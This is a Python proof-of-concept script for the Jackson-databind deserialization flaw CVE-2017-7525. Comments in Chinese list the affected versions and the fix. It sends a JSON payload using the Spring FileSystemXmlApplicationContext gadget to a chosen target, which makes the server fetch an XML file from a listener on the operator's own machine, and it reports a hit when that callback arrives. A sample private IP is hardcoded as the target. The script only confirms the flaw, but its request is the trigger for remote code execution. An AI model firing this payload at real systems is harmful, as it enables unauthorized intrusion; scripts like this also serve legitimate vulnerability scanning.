# -*- coding:utf-8 -*-
#Written by hacden 2020/07/11
#Exec python3
'''
Jackson-databind 反序列化漏洞（CVE-2017-7525）
受影响的版本
Jackson-databind version <= 2.9.3
Jackson-databind version <= 2.7.9.1
Jackson-databind version <= 2.8.10
修复：升级Jackson-dababind的最新主要版本
'''
import requests
import string
import random
import socket
import time
import multiprocessing


def random_string(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def get_localhost_ip():
    #查询本机ip地址
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(('8.8.8.8',80))
        localhost = s.getsockname()[0]
        return localhost
    except:
        pass

def get_client_http(pipe,string_reve,localhost):
    try:
        service_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        service_server_socket.bind((localhost, 23456))
        service_server_socket.listen(5)
        timeout = 5
        socket.setdefaulttimeout(timeout)
        while 1:
            service_client_socket, cliet_ip_port = service_server_socket.accept()
            # 4.接收客户端发送的http请求报文数据
            recv_data = service_client_socket.recv(4096)
            # 5.显示原始http请求报文数据
            if string_reve in str(recv_data):
                service_client_socket.close()
                service_server_socket.close()
                pipe.send(recv_data)
                break
            else:
                return False
    except Exception as e:
        print(e)
        return False

def check_jackson_rce(url_dir,string_reve,localhost):
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        'Connection': "close",
        'Content-Type': "application/json",
        'Accept': "*/*",
    }
    payload = "{\"param\":[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://%s:23456/%s.xml\"]}"%(localhost,string_reve)
    requests.post(url=url_dir,headers=headers,data=payload,timeout=3)

def recv_data(pipe,url_dir):
    msg = "[+] There is Seem is Jackson-databind_rce CVE-2017-7525 Vuln!。"
    pipe.recv()
    print((True,url_dir,msg))

def process_to_two(url_dir,string_reve,localhost):
    try:
        # 父进程创建pipe，并传给各个子进程
        pipe = multiprocessing.Pipe()
        p0 = multiprocessing.Process(target=get_client_http, args=(pipe[0],string_reve,localhost))
        p1 = multiprocessing.Process(target=recv_data, args=(pipe[1],url_dir))
        p0.start()
        p1.start()
        p0.join()

    except:
        exit(0)

def verify(protol, ip, port,exploit_dir):
    ip = ip.strip()
    exploit_dir = exploit_dir.strip()
    if port.strip():
        url_dir = protol.strip() + "://" + ip + ":" + port.strip() + exploit_dir
    else:
        url_dir = protol.strip() + "://" + ip + exploit_dir
    stringLength = 50
    string_reve = random_string(stringLength)
    localhost = get_localhost_ip()
    process_to_two(url_dir,string_reve, localhost)
    try:
        check_jackson_rce(url_dir,string_reve,localhost)
    except Exception as e:
        exit(0)


if __name__ == '__main__':
    ip = "192.168.43.90"
    print(verify("http", ip, "8081","  /exploit    "))
